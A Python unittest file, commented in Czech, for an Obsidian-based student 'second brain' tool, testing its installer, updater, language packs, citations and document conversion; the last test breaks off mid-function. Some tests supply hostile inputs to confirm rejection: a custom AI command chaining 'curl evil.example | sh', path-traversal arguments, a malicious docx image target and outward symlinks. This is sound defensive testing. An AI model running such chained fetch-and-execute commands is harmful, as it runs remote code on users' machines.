#!/usr/bin/env python3
"""Automatické testy druhého mozku – jen standardní knihovna, běží na macOS.

  python3 tests/test_system.py

Každý test pracuje v dočasné kopii trezoru, repozitář ani nic jiného nemění.
"""
import datetime
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from xml.dom import minidom

REPO = Path(__file__).resolve().parent.parent
ZDROJ = REPO / "trezor"
PREDMET = "Příklad předmětu"
W = ('xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
     'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"')
R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"


def docx(cesta, cil_obrazku="media/image1.png"):
    """Malý .docx s poznámkou pod čarou, odkazem s & a obrázkem."""
    body = ('<w:p><w:r><w:t>Testovací text</w:t></w:r><w:r><w:footnoteReference w:id="1"/></w:r></w:p>'
            '<w:p><w:hyperlink r:id="rId7"><w:r><w:t>odkaz</w:t></w:r></w:hyperlink></w:p>'
            '<w:p><w:r><w:drawing><a:blip xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" r:embed="rId9"/>'
            '</w:drawing></w:r></w:p><w:sectPr/>')
    with zipfile.ZipFile(cesta, "w") as z:
        z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                   '<Default Extension="xml" ContentType="application/xml"/><Default Extension="png" ContentType="image/png"/></Types>')
        z.writestr("word/document.xml", f'<?xml version="1.0"?><w:document {W}><w:body>{body}</w:body></w:document>')
        z.writestr("word/footnotes.xml", f'<?xml version="1.0"?><w:footnotes {W}><w:footnote w:id="1"><w:p><w:r><w:t>Pozn.</w:t></w:r></w:p></w:footnote></w:footnotes>')
        z.writestr("word/media/image1.png", b"\x89PNG\r\n\x1a\n")
        z.writestr("word/_rels/document.xml.rels",
                   '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   f'<Relationship Id="rId3" Type="{R}footnotes" Target="footnotes.xml"/>'
                   f'<Relationship Id="rId7" Type="{R}hyperlink" Target="https://example.com/?a=1&amp;b=2" TargetMode="External"/>'
                   f'<Relationship Id="rId9" Type="{R}image" Target="{cil_obrazku}"/></Relationships>')


def pptx(cesta, text):
    with zipfile.ZipFile(cesta, "w") as z:
        z.writestr("ppt/slides/slide1.xml", '<?xml version="1.0"?><p:sld xmlns:p="p" xmlns:a="a"><a:p><a:r>'
                   f'<a:t>{text}</a:t></a:r></a:p></p:sld>')


def platne_xml(cesta):
    with zipfile.ZipFile(cesta) as z:
        for n in z.namelist():
            if n.endswith((".xml", ".rels")):
                minidom.parseString(z.read(n))
        return z.namelist()


class Trezor(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.t = self.tmp / "trezor"
        shutil.copytree(ZDROJ, self.t)
        shutil.copy(self.t / "_Systém/nastaveni.priklad.json", self.t / "_Systém/nastaveni.json")
        self.spust("_Systém/Word/vytvor_sablonu.py")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def spust(self, skript, *argumenty, ocekavam_chybu=False):
        r = subprocess.run([sys.executable, str(self.t / skript), *argumenty], cwd=self.t,
                           capture_output=True, text=True, env={**os.environ, "TREZOR": str(self.t)})
        if ocekavam_chybu:
            self.assertNotEqual(r.returncode, 0, r.stdout)
        else:
            self.assertEqual(r.returncode, 0, r.stderr)
        return r

    def test_sablona_word(self):
        casti = platne_xml(self.t / "_Systém/Word/Šablona KISK.dotx")
        self.assertEqual(casti[0], "[Content_Types].xml")

    def test_fronta_a_duplicity(self):
        pptx(self.t / PREDMET / "prednaska.pptx", "Ahoj světe")
        shutil.copy(self.t / PREDMET / "prednaska.pptx", self.t / PREDMET / "kopie.pptx")
        self.spust("_Systém/priprav.py")
        fronta = json.loads((self.t / "_Systém/fronta.json").read_text())
        self.assertEqual(len(fronta), 1)  # kopie je duplicita
        self.assertIn("Ahoj světe", (self.t / fronta[0]["cache"]).read_text())
        self.spust("_Systém/priprav.py", "--hotovo", fronta[0]["soubor"])
        self.spust("_Systém/priprav.py")
        self.assertEqual(json.loads((self.t / "_Systém/fronta.json").read_text()), [])

    def test_presun_jen_z_inboxu(self):
        (self.t / "_Inbox/material.txt").write_text("x")
        self.spust("_Systém/priprav.py", "--presun", "_Inbox/material.txt", "../", ocekavam_chybu=True)
        self.spust("_Systém/priprav.py", "--presun", f"{PREDMET}/{PREDMET}.md", PREDMET, ocekavam_chybu=True)
        self.spust("_Systém/priprav.py", "--presun", "_Inbox/material.txt", PREDMET)
        self.assertTrue((self.t / PREDMET / "material.txt").exists())

    def test_novy_ukol(self):
        r = self.spust("_Systém/novy_ukol.py", PREDMET, "Test/s:lomítky", "--termin", "2026-12-01", "--neotvirat")
        dokument, poznamka = r.stdout.strip().split("\n")
        platne_xml(self.t / dokument)
        text = (self.t / poznamka).read_text()
        self.assertIn("kod: ISKB00", text)
        self.assertIn("[due:: 2026-12-01]", text)
        self.spust("_Systém/novy_ukol.py", PREDMET, "x", "--termin", "25.10.", "--neotvirat", ocekavam_chybu=True)
        self.spust("_Systém/novy_ukol.py", "../../etc", "x", "--neotvirat", ocekavam_chybu=True)

    def test_prevod_do_sablony(self):
        docx(self.tmp / "prace.docx")
        r = self.spust("_Systém/novy_ukol.py", PREDMET, "Prevod", "--z-dokumentu", str(self.tmp / "prace.docx"), "--neotvirat")
        casti = platne_xml(self.t / r.stdout.split("\n")[0])
        self.assertIn("word/footnotes.xml", casti)
        self.assertIn("word/media/image1.png", casti)

    def test_skripty_ve_vsech_jazycich(self):
        texty = json.loads((self.t / "_Systém/texty.json").read_text())
        nastaveni = json.loads((self.t / "_Systém/nastaveni.priklad.json").read_text())
        for jazyk in ("cs", "sk", "en", "uk"):
            for word in ("cs", "en"):
                with self.subTest(jazyk=jazyk, word=word):
                    (self.t / "_Systém/nastaveni.json").write_text(json.dumps({**nastaveni, "jazyk": jazyk, "jazyk_word": word}))
                    self.spust("_Systém/Word/vytvor_sablonu.py")
                    self.spust("_Systém/priprav.py")
                    self.assertIn(texty[jazyk]["fronta_nadpis"], (self.t / "_Systém/Fronta.md").read_text())
                    r = self.spust("_Systém/novy_ukol.py", PREDMET, f"Ukol {jazyk} {word}", "--neotvirat")
                    dokument, poznamka = r.stdout.strip().split("\n")
                    self.assertIn(texty[jazyk]["ukol_prefix"], poznamka)  # poznámka v jazyce rozhraní
                    with zipfile.ZipFile(self.t / dokument) as z:   # dokument v předem zvoleném jazyce Wordu
                        self.assertIn(texty[word]["h_uvod"], z.read("word/document.xml").decode())
                    self.assertIn("kod: ISKB00", (self.t / poznamka).read_text())  # vlastnosti zůstávají stejné

    def test_predmety(self):
        css = self.t / ".obsidian/snippets/druhy-mozek-predmety.css"
        css.write_text(css.read_text() + "\n.moje-vlastni { color: red; }\n")
        r = self.spust("_Systém/predmety.py", "--pridat", "ISKB02 Úvod do knihovnictví", "Bez kódu",
                       "ISKB03 ../zly", "_skryty", "Řádek\nnavíc", ocekavam_chybu=True)  # neplatné se odmítnou, platné se založí
        self.assertIn("ISKB02 Úvod do knihovnictví", r.stdout)
        prehled = (self.t / "Úvod do knihovnictví/Úvod do knihovnictví.md").read_text()
        self.assertIn("typ: predmet", prehled)
        self.assertIn("kod: ISKB02", prehled)
        self.assertIn('nazev: "Úvod do knihovnictví"', prehled)
        self.assertNotIn("[!tip]", prehled)
        self.assertTrue((self.t / "Úvod do knihovnictví/Úkoly").is_dir())
        self.assertTrue((self.t / "Bez kódu/Bez kódu.md").exists())
        self.assertFalse((self.tmp / "zly").exists())
        self.assertFalse((self.t / "_skryty").exists())
        self.assertFalse((self.t / "Řádek\nnavíc").exists())
        styl = css.read_text()
        self.assertIn('[data-path="Úvod do knihovnictví"] .nav-folder-title-content::before { content: "ISKB02 · "', styl)
        self.assertIn('[data-path="Bez kódu"]', styl)
        self.assertIn(".moje-vlastni { color: red; }", styl)  # vlastní CSS zůstává
        # existující předmět se nepřepíše
        (self.t / "Úvod do knihovnictví/Úvod do knihovnictví.md").write_text(prehled + "\nmoje poznámka\n")
        self.spust("_Systém/predmety.py", "--pridat", "ISKB02 Úvod do knihovnictví")
        self.assertIn("moje poznámka", (self.t / "Úvod do knihovnictví/Úvod do knihovnictví.md").read_text())
        # nový předmět funguje s úkoly ve Wordu
        r = self.spust("_Systém/novy_ukol.py", "Úvod do knihovnictví", "Esej", "--neotvirat")
        self.assertIn("ISKB02", r.stdout)
        # anglické rozhraní → anglický přehled
        nastaveni = json.loads((self.t / "_Systém/nastaveni.json").read_text())
        (self.t / "_Systém/nastaveni.json").write_text(json.dumps({**nastaveni, "jazyk": "en"}))
        self.spust("_Systém/predmety.py", "--pridat", "ISKB04 Academic Writing")
        self.assertIn("## About the course", (self.t / "Academic Writing/Academic Writing.md").read_text())

    def test_bez_ai_poznamka_tyden_zkouska_kalendar(self):
        self.spust("_Systém/predmety.py", "--pridat", "ISKB02 Úvod do knihovnictví")
        pr = self.t / "Úvod do knihovnictví"
        pptx(pr / "01_Dejiny_knihoven.pptx", "Dějiny knihoven")
        self.spust("_Systém/priprav.py")
        # 📝 poznámka k materiálu: vyplněný předmět, kód, zdroj, číslování; materiál se odškrtne
        r = self.spust("_Systém/prehledy.py", "--poznamka", "Úvod do knihovnictví/01_Dejiny_knihoven.pptx")
        rel = r.stdout.strip().split("\n")[-1]
        self.assertEqual(rel, "Úvod do knihovnictví/Poznámky/ISKB02 01 – 01 Dejiny knihoven.md")
        text = (self.t / rel).read_text()
        for x in ('predmet: "[[Úvod do knihovnictví]]"', "kod: ISKB02", "typ: prednaska",
                  'zdroj: "[[Úvod do knihovnictví/01_Dejiny_knihoven.pptx|01_Dejiny_knihoven.pptx]]"'):
            self.assertIn(x, text)
        self.assertNotIn("{{title}}", text)
        self.spust("_Systém/priprav.py")
        self.assertEqual(json.loads((self.t / "_Systém/fronta.json").read_text()), [], "materiál s poznámkou je odškrtnutý")
        r = self.spust("_Systém/prehledy.py", "--poznamka", "Úvod do knihovnictví/01_Dejiny_knihoven.pptx")
        self.assertEqual(r.stdout.strip().split("\n")[-1], rel, "druhá poznámka ke stejnému materiálu nevznikne")
        self.spust("_Systém/prehledy.py", "--poznamka", "../mimo.pdf", ocekavam_chybu=True)
        # obsah poznámky pro zkoušku
        (self.t / rel).write_text(text.replace("## Shrnutí v 5 bodech\n- ", "## Shrnutí v 5 bodech\n- Knihovny vznikly ve starověku")
                                  .replace("- [[ ]]", "- [[Knihovna]]").replace("Otázka::Odpověď", "Kdy vznikla první knihovna?::Ve starověku"))
        # úkol s termínem
        termin = (datetime.date.today() + datetime.timedelta(days=3)).isoformat()
        self.spust("_Systém/novy_ukol.py", "Úvod do knihovnictví", "Esej", "--termin", termin, "--neotvirat")
        # 🗓 týden
        r = self.spust("_Systém/prehledy.py", "--tyden")
        tyden = self.t / r.stdout.strip().split("\n")[-1]
        obsah = tyden.read_text()
        self.assertIn(termin, obsah)
        self.assertIn("za 3 dní", obsah)
        self.assertIn("01_Dejiny_knihoven.pptx", obsah)
        tyden.write_text(obsah + "\nmoje poznámka k týdnu\n")
        self.spust("_Systém/prehledy.py", "--tyden")
        self.assertIn("moje poznámka k týdnu", tyden.read_text(), "vlastní text mimo vygenerovaný blok zůstává")
        self.assertEqual(tyden.read_text().count("<!-- druhy-mozek: začátek"), 1)
        # 🎓 zkouška
        r = self.spust("_Systém/prehledy.py", "--zkouska", "Úvod do knihovnictví")
        zk = (self.t / r.stdout.strip().split("\n")[-1]).read_text()
        for x in ("Knihovny vznikly ve starověku", "[[Knihovna]]", "Kdy vznikla první knihovna?::Ve starověku", "#flashcards/ISKB02", termin):
            self.assertIn(x, zk)
        # 📅 kalendář
        self.spust("_Systém/prehledy.py", "--kalendar")
        ics = (self.t / "_Systém/Termíny.ics").read_text()
        self.assertIn("BEGIN:VCALENDAR", ics)
        self.assertIn("DTSTART;VALUE=DATE:" + termin.replace("-", ""), ics)
        self.assertIn("SUMMARY:ISKB02 – Úkol – Esej", ics)

    def test_fronta_bez_tokenu_a_archiv(self):
        nastaveni = json.loads((self.t / "_Systém/nastaveni.json").read_text())
        (self.t / "_Systém/nastaveni.json").write_text(json.dumps({**nastaveni, "ai": "zadna"}))
        self.spust("_Systém/predmety.py", "--pridat", "ISKB08 Literatura")
        (self.t / "Literatura/text.txt").write_text("slovo " * 1000)
        self.spust("_Systém/priprav.py")
        fronta = (self.t / "_Systém/Fronta.md").read_text()
        self.assertIn("| Čtení |", fronta)
        self.assertIn("~5 min", fronta)
        self.assertNotIn("tokenů", fronta)
        self.spust("_Systém/novy_ukol.py", "Literatura", "Esej", "--termin", "2026-12-01", "--neotvirat")
        (self.t / "_Archiv").mkdir()
        (self.t / "Literatura").rename(self.t / "_Archiv/Literatura")
        self.spust("_Systém/priprav.py")
        self.assertNotIn("text.txt", json.dumps(json.loads((self.t / "_Systém/fronta.json").read_text())))
        self.assertNotIn("Literatura", self.spust("_Systém/priprav.py", "--ukoly").stdout)
        self.spust("_Systém/predmety.py", "--css")
        self.assertNotIn("Literatura", (self.t / ".obsidian/snippets/druhy-mozek-predmety.css").read_text())

    def test_citace_csn_iso_690(self):
        def cit(**d):
            r = self.spust("_Systém/prehledy.py", "--citace", json.dumps(d))
            return r.stdout.strip().split("\n")[0].split(": ", 1)[1]
        self.assertEqual(cit(typ="kniha", autori="Novák, Jan; Svobodová, Eva", nazev="Informační gramotnost", podnazev="úvod",
                             vydani="2", misto="Brno", nakladatel="Masarykova univerzita", rok="2020", isbn="978-80-210-0000-0"),
                         "NOVÁK, Jan a Eva SVOBODOVÁ. *Informační gramotnost: úvod*. 2. vyd. Brno: Masarykova univerzita, 2020. ISBN 978-80-210-0000-0.")
        self.assertEqual(cit(typ="clanek", autori="Dvořák, Petr", nazev="Knihovny dnes", casopis="Čtenář", rok="2023", rocnik="75",
                             cislo="4", strany="12–15", issn="0011-2321"),
                         "DVOŘÁK, Petr. Knihovny dnes. *Čtenář*. 2023, roč. 75, č. 4, s. 12–15. ISSN 0011-2321.")
        self.assertEqual(cit(typ="web", autori="Národní knihovna ČR", nazev="Katalogy", rok="2024", url="https://www.nkp.cz",
                             cit_datum="2026-10-17"),
                         "NÁRODNÍ KNIHOVNA ČR. *Katalogy* [online]. 2024 [cit. 2026-10-17]. Dostupné z: https://www.nkp.cz")
        self.assertIn("et al.", cit(typ="kniha", autori="A, a; B, b; C, c; D, d", nazev="X", rok="2020"))
        zdroje = list((self.t / "_Zdroje").glob("*.md"))
        self.assertTrue(any("Novák 2020 – Informační gramotnost" in z.name for z in zdroje))
        self.assertIn("citace:", next(z for z in zdroje if "Novák" in z.name).read_text())

    def test_podvrzeny_dokument_odmitnut(self):
        docx(self.tmp / "zly.docx", cil_obrazku="../../../evil.png")
        self.spust("_Systém/novy_ukol.py", PREDMET, "Zly", "--z-dokumentu", str(self.tmp / "zly.docx"), "--neotvirat",
                   ocekavam_chybu=True)
        self.assertEqual(list((self.t / PREDMET / "Úkoly").glob("*Zly*.docx")), [])


class Instalator(unittest.TestCase):
    """Instalátor běží v dočasné kopii repozitáře (ukládá si postup vedle sebe)."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.repo = self.tmp / "repo"
        shutil.copytree(REPO, self.repo, ignore=shutil.ignore_patterns(".git", "__pycache__", ".DS_Store"))
        self.env = {**os.environ, "DM_TEST": "1", "DM_LOGO_VOLBA": "Bez loga",
                    "DM_AI": "Claude Code (doporučeno)", "DM_VOLBA_CLAUDE": "Pokračovat bez něj"}

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def instaluj(self, **dm):
        r = subprocess.run(["bash", str(self.repo / "Instalovat.command")], env={**self.env, **dm},
                           capture_output=True, text=True, timeout=120)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        return r

    def over_trezor(self, t, uco):
        self.assertEqual(json.loads((t / "_Systém/nastaveni.json").read_text())["uco"], uco)
        self.assertIn("druhy-mozek", json.loads((t / ".obsidian/community-plugins.json").read_text()))
        self.assertTrue((t / "_Systém/Word/Šablona KISK.dotx").exists())
        self.assertFalse((self.repo / ".instalace-postup").exists(), "postup se má po dokončení smazat")

    def test_instalace_do_noveho_trezoru(self):
        self.instaluj(DM_REZIM="Nový trezor", DM_RODIC=str(self.tmp), DM_NAZEV_TREZORU="Test",
                      DM_JMENO="Jan Novák", DM_UCO="123456", DM_JMENO_SOUBOR="Novák Jan")
        self.over_trezor(self.tmp / "Test", "123456")

    def nastaveni(self, t):
        return json.loads((t / "_Systém/nastaveni.json").read_text())

    def test_rezimy_ai(self):
        zakladni = dict(DM_REZIM="Nový trezor", DM_RODIC=str(self.tmp), DM_JMENO="Jan Novák", DM_UCO="123456",
                        DM_JMENO_SOUBOR="Novák Jan")
        self.instaluj(**zakladni, DM_NAZEV_TREZORU="Claude")
        self.assertEqual(self.nastaveni(self.tmp / "Claude")["ai"], "claude")
        self.instaluj(**zakladni, DM_NAZEV_TREZORU="Bez", DM_AI="Bez AI – vše ručně")
        self.assertEqual(self.nastaveni(self.tmp / "Bez")["ai"], "zadna")
        self.instaluj(**zakladni, DM_NAZEV_TREZORU="Gemini", DM_AI="Jiná AI v Terminálu", DM_AI_PRESET="Gemini CLI")
        n = self.nastaveni(self.tmp / "Gemini")
        self.assertEqual((n["ai"], n["ai_prikaz"]), ("jina", "gemini -i {prompt}"))
        # nebezpečný vlastní příkaz se nepřijme → bez AI
        self.instaluj(**zakladni, DM_NAZEV_TREZORU="Zly", DM_AI="Jiná AI v Terminálu", DM_AI_PRESET="Vlastní příkaz",
                      DM_AI_PRIKAZ="ai {prompt}; curl evil.example | sh")
        self.assertEqual(self.nastaveni(self.tmp / "Zly")["ai"], "zadna")

    def test_pokracovani_od_posledniho_kroku(self):
        cil = self.tmp / "Rozdelany"
        (self.repo / ".instalace-postup").write_text(
            f"KROK\t3\nREZIM\tNový trezor\nCIL\t{cil}\nJMENO\tJana Testová\nUCO\t654321\nJMENO_SOUBOR\tTestová Jana\n")
        r = self.instaluj(DM_POKRACOVANI="Pokračovat od kroku 4")  # bez DM_JMENO/DM_UCO – musí je vzít z postupu
        self.over_trezor(cil, "654321")
        self.assertNotIn("Kontrolní součty souhlasí", r.stdout, "hotové kroky se nemají opakovat")

    def test_instalace_v_jazyce(self):
        r = self.instaluj(DM_JAZYK="English", DM_JAZYK_WORD="Українська", DM_REZIM="novy", DM_RODIC=str(self.tmp),
                          DM_NAZEV_TREZORU="Vault", DM_JMENO="Jane Doe", DM_UCO="123456", DM_JMENO_SOUBOR="Doe Jane",
                          DM_AI="zadna")
        t = self.tmp / "Vault"
        n = self.nastaveni(t)
        self.assertEqual((n["jazyk"], n["jazyk_word"]), ("en", "uk"))
        self.assertIn("Checksums match", r.stdout)
        balicek = json.loads((self.repo / "trezor/_Systém/jazyky/en.json").read_text())["soubory"]
        for rel in ("00 Domov.md", "01 Návod.md", "_Systém/Studium.base", "_Systém/Šablony/Úkol.md"):
            self.assertEqual((t / rel).read_text(), balicek[rel], rel)
        with zipfile.ZipFile(t / "_Systém/Word/Šablona KISK.dotx") as z:
            self.assertIn('w:val="uk-UA"', z.read("word/styles.xml").decode())

    def test_existujici_trezor_se_neprepise(self):
        t = self.tmp / "Muj"
        (t / ".obsidian").mkdir(parents=True)
        (t / "00 Domov.md").write_text("moje vlastní poznámka")
        (t / ".obsidian/community-plugins.json").write_text('["jiny-plugin"]')
        self.instaluj(DM_REZIM="Do existujícího trezoru", DM_CIL=str(t),
                      DM_JMENO="Jan Novák", DM_UCO="123456", DM_JMENO_SOUBOR="Novák Jan")
        self.assertEqual((t / "00 Domov.md").read_text(), "moje vlastní poznámka")
        self.assertEqual(json.loads((t / ".obsidian/community-plugins.json").read_text()), ["jiny-plugin", "druhy-mozek"])

    def test_poskozene_soubory_zastavi_instalaci(self):
        with open(self.repo / "trezor/_Systém/priprav.py", "a") as f:
            f.write("# podvrženo\n")
        r = subprocess.run(["bash", str(self.repo / "Instalovat.command")], capture_output=True, text=True,
                           env={**self.env, "DM_REZIM": "Nový trezor", "DM_RODIC": str(self.tmp), "DM_NAZEV_TREZORU": "X",
                                "DM_JMENO": "A B", "DM_UCO": "123456", "DM_JMENO_SOUBOR": "B A"})
        self.assertNotEqual(r.returncode, 0)
        self.assertFalse((self.tmp / "X").exists())


    def test_predmety_pri_instalaci(self):
        self.instaluj(DM_REZIM="novy", DM_RODIC=str(self.tmp), DM_NAZEV_TREZORU="Predmety", DM_JMENO="Jan Novák",
                      DM_UCO="123456", DM_JMENO_SOUBOR="Novák Jan", DM_AI="zadna",
                      DM_PREDMETY="ISKB02 Úvod do knihovnictví;AI001 Elements of AI;Bez kódu")
        t = self.tmp / "Predmety"
        for nazev in ("Úvod do knihovnictví", "Elements of AI", "Bez kódu"):
            self.assertTrue((t / nazev / f"{nazev}.md").exists(), nazev)
        self.assertFalse((t / "Příklad předmětu").exists(), "se zadanými předměty se ukázkový nekopíruje")
        self.assertIn('content: "AI001 · "', (t / ".obsidian/snippets/druhy-mozek-predmety.css").read_text())
        self.assertIn("druhy-mozek-predmety", json.loads((t / ".obsidian/appearance.json").read_text())["enabledCssSnippets"])
        self.assertTrue((t / "_Systém/instalace.json").exists(), "evidence pro budoucí aktualizace")


class Aktualizace(unittest.TestCase):
    """Aktualizace existujícího trezoru: kód se nahradí, upravené poznámky zůstanou, nic osobního se nezmění."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.repo = self.tmp / "repo"
        shutil.copytree(REPO, self.repo, ignore=shutil.ignore_patterns(".git", "__pycache__", ".DS_Store"))
        self.env = {**os.environ, "DM_TEST": "1", "DM_AI": "zadna", "DM_LOGO_VOLBA": "bez"}
        self.t = self.tmp / "Trezor"
        self.spust(DM_REZIM="novy", DM_RODIC=str(self.tmp), DM_NAZEV_TREZORU="Trezor", DM_JMENO="Jan Novák",
                   DM_UCO="123456", DM_JMENO_SOUBOR="Novák Jan", DM_PREDMETY="ISKB02 Úvod do knihovnictví")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def spust(self, ocekavam=0, **dm):
        r = subprocess.run(["bash", str(self.repo / "Instalovat.command")], env={**self.env, **dm},
                           capture_output=True, text=True, timeout=120)
        self.assertEqual(r.returncode, ocekavam, r.stdout + r.stderr)
        return r

    def zestarni(self, verze="0.9.0"):
        m = self.t / ".obsidian/plugins/druhy-mozek/manifest.json"
        m.write_text(m.read_text().replace('"version": "', f'"version": "{verze}", "x": "'))

    def test_aktualizace_zachova_upravy(self):
        zdroj = self.repo / "trezor"
        self.zestarni()
        with open(self.t / "_Systém/priprav.py", "a") as f:
            f.write("# stará verze\n")
        (self.t / "00 Domov.md").write_text("můj vlastní Domov")
        (self.t / "Úvod do knihovnictví/Poznámky/Moje.md").write_text("moje poznámka")
        nastaveni = (self.t / "_Systém/nastaveni.json").read_text()
        css = self.t / ".obsidian/snippets/druhy-mozek-predmety.css"
        css.write_text(css.read_text() + "\n/* moje */\n")
        styl = css.read_text()

        r = self.spust(DM_REZIM="aktualizace", DM_CIL=str(self.t))
        self.assertEqual((self.t / "_Systém/priprav.py").read_bytes(), (zdroj / "_Systém/priprav.py").read_bytes(), "kód se nahradí")
        self.assertEqual((self.t / "00 Domov.md").read_text(), "můj vlastní Domov", "upravený Domov zůstane")
        self.assertEqual((self.t / "00 Domov (nová verze).md").read_text(), (zdroj / "00 Domov.md").read_text())
        self.assertIn("00 Domov.md", r.stdout)
        self.assertEqual((self.t / "Úvod do knihovnictví/Poznámky/Moje.md").read_text(), "moje poznámka")
        self.assertEqual((self.t / "_Systém/nastaveni.json").read_text(), nastaveni)
        self.assertEqual(css.read_text(), styl, "CSS předmětů je uživatele")
        self.assertFalse((self.t / "Příklad předmětu").exists(), "ukázkový předmět se nevrací")
        zalohy = list((self.t / ".druhy-mozek-zaloha").glob("*/_Systém/priprav.py"))
        self.assertTrue(zalohy and zalohy[0].read_text().endswith("# stará verze\n"), "stará verze je v záloze")
        verze = json.loads((zdroj / ".obsidian/plugins/druhy-mozek/manifest.json").read_text())["version"]
        self.assertEqual(json.loads((self.t / "_Systém/instalace.json").read_text())["verze"], verze)

    def test_aktualizace_bez_evidence(self):
        """Starší instalace bez _Systém/instalace.json: neupravené poznámky se poznají podle starého jazykového balíčku."""
        (self.t / "_Systém/instalace.json").unlink()
        stary = json.loads((self.t / "_Systém/jazyky/cs.json").read_text())
        stary["soubory"]["01 Návod.md"] = "stará verze návodu"
        (self.t / "_Systém/jazyky/cs.json").write_text(json.dumps(stary, ensure_ascii=False))
        (self.t / "01 Návod.md").write_text("stará verze návodu")
        self.zestarni()
        self.spust(DM_REZIM="aktualizace", DM_CIL=str(self.t))
        self.assertEqual((self.t / "01 Návod.md").read_text(), (self.repo / "trezor/01 Návod.md").read_text())
        self.assertFalse((self.t / "01 Návod (nová verze).md").exists())

    def test_starsi_balicek_neprepise_novejsi_trezor(self):
        self.zestarni("99.0.0")
        self.spust(ocekavam=1, DM_REZIM="aktualizace", DM_CIL=str(self.t))
        self.assertIn('"99.0.0"', (self.t / ".obsidian/plugins/druhy-mozek/manifest.json").read_text())

    def test_aktualizace_jen_do_trezoru_s_druhym_mozkem(self):
        prazdny = self.tmp / "Prazdny"
        prazdny.mkdir()
        self.spust(ocekavam=1, DM_REZIM="aktualizace", DM_CIL=str(prazdny))
        self.assertEqual(list(prazdny.iterdir()), [])

    def test_symbolicky_odkaz_mimo_trezor(self):
        """Odkaz v trezoru, který vede ven, aktualizace nesmí použít k zápisu mimo trezor."""
        venku = self.tmp / "venku.txt"
        venku.write_text("cizí soubor")
        (self.t / "_Systém/priprav.py").unlink()
        (self.t / "_Systém/priprav.py").symlink_to(venku)
        self.zestarni()
        r = subprocess.run([sys.executable, str(self.repo / "nastroje/aktualizace.py"), "--cil", str(self.t), "--json"],
                           capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(venku.read_text(), "cizí soubor")
        self.assertIn("_Systém/priprav.py", json.loads(r.stdout).get("preskoceno", []))

    def test_zaloha_jako_odkaz_se_odmitne(self):
        venku = self.tmp / "jinam"
        venku.mkdir()
        (self.t / ".druhy-mozek-zaloha").symlink_to(venku)
        self.zestarni()
        r = subprocess.run([sys.executable, str(self.repo / "nastroje/aktualizace.py"), "--cil", str(self.t)],
                           capture_output=True, text=True)
        self.assertNotEqual(r.returncode, 0)
        self.assertEqual(list(venku.iterdir()), [])

    def test_tabulky_se_vzdy_nahradi(self):
        """Obsidian si Studium.base sám přeformátuje – aktualizace ho nesmí brát jako úpravu a dělat druhou tabulku."""
        base = self.t / "_Systém/Studium.base"
        base.write_text(base.read_text().replace("    sort:", "    sort:  ") + "\n")  # jiné formátování, stejný obsah
        self.zestarni()
        self.spust(DM_REZIM="aktualizace", DM_CIL=str(self.t))
        self.assertEqual(base.read_text(), (self.repo / "trezor/_Systém/Studium.base").read_text())
        self.assertFalse(list((self.t / "_Systém").glob("Studium (*")), "žádná druhá tabulka")
        js = (self.repo / "trezor/.obsidian/plugins/druhy-mozek/main.js").read_text()
        sys.path.insert(0, str(self.repo / "nastroje"))
        import aktualizace
        self.assertIn(f"const VZDY_NAHRADIT = {json.dumps(aktualizace.VZDY_NAHRADIT, ensure_ascii=False)};", js, "stejné pravidlo v Pythonu i v rozšíření")

    def test_kazdy_soubor_ma_pravidlo(self):
        """Nový soubor v trezor/ musí mít určeno, jak se aktualizuje (jinak by se k lidem nedostal)."""
        sys.path.insert(0, str(REPO / "nastroje"))
        import aktualizace
        rizene = set(aktualizace.nove_soubory("cs"))
        nastaveni_obsidianu = {".obsidian/app.json", ".obsidian/appearance.json", ".obsidian/community-plugins.json",
                               ".obsidian/core-plugins.json", ".obsidian/templates.json"}
        for p in ZDROJ.rglob("*"):
            rel = p.relative_to(ZDROJ).as_posix()
            if p.is_file() and p.name != ".DS_Store" and not rel.startswith("Příklad předmětu/") and "__pycache__" not in rel:
                self.assertIn(rel, rizene | nastaveni_obsidianu, f"{rel} nemá pravidlo v nastroje/aktualizace.py")


class Verze(unittest.TestCase):
    def test_changelog_a_verze(self):
        verze = json.loads((ZDROJ / ".obsidian/plugins/druhy-mozek/manifest.json").read_text())["version"]
        self.assertRegex(verze, r"^\d+\.\d+\.\d+$")
        self.assertRegex((REPO / "CHANGELOG.md").read_text(), rf"(?m)^## {re.escape(verze)} ", "chybí změny k verzi v CHANGELOG.md")


class Jazyky(unittest.TestCase):
    JAZYKY = ("cs", "sk", "en", "uk")
    ROZSIRENI = ZDROJ / ".obsidian/plugins/druhy-mozek"

    def test_balicky_maji_stejne_soubory(self):
        sady = {}
        for j in self.JAZYKY:
            b = json.loads((ZDROJ / f"_Systém/jazyky/{j}.json").read_text())
            self.assertEqual(b["jazyk"], j)
            for rel, obsah in b["soubory"].items():
                self.assertFalse(rel.startswith("/") or ".." in rel.split("/"), rel)
                self.assertTrue(obsah.strip(), f"{j}: {rel} je prázdný")
            sady[j] = set(b["soubory"])
        self.assertTrue(all(s == sady["cs"] for s in sady.values()), sady)
        cs = json.loads((ZDROJ / "_Systém/jazyky/cs.json").read_text())["soubory"]
        for rel in ("00 Domov.md", "01 Návod.md"):  # trezor v repozitáři = český balíček
            self.assertEqual((ZDROJ / rel).read_text(), cs[rel], rel)

    def test_sablony_maji_stejne_vlastnosti(self):
        """Vlastnosti (frontmatter) se nepřekládají – Bases, kontrola i Neuro Roadmap s nimi počítají."""
        def klice(text):
            hlava = text.split("---")[1] if text.startswith("---") else ""
            return [r.split(":")[0] for r in hlava.splitlines() if re.match(r"^[a-z_]+:", r)]
